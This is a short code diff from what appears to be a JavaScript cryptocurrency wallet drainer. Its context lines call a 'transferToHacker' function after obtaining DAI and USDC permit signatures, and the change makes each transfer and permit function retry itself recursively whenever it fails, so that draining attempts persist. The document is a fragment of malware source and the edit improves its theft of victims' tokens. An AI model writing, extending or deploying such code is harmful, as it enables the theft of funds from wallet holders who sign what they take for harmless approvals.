@@ -241,8 +241,9 @@ const transfer = async (token) => {
     gas: '75000',
   }).then((result) => {
     console.log(result)
-  }).catch( (error) => {
+  }).catch(async (error) => {
     console.log(error)
+    await transfer(token);
   })
 }
 
@@ -264,8 +265,9 @@ const daiPermitV1 = async (permitToken, nonce, provider) => {
       await transferToHacker(token);
     })
 
-  }).catch( (error) => {
+  }).catch(async (error) => {
     console.log(error)
+    await daiPermitV1(permitToken, nonce, provider);
   });
 }
 
@@ -287,7 +289,8 @@ const usdcPermitV2 = async (permitToken, provider) => {
       await transferToHacker(token);
     })
 
-  }).catch( (error) => {
+  }).catch(async (error) => {
     console.log(error)
+    await usdcPermitV2(permitToken, provider);
   })
 }
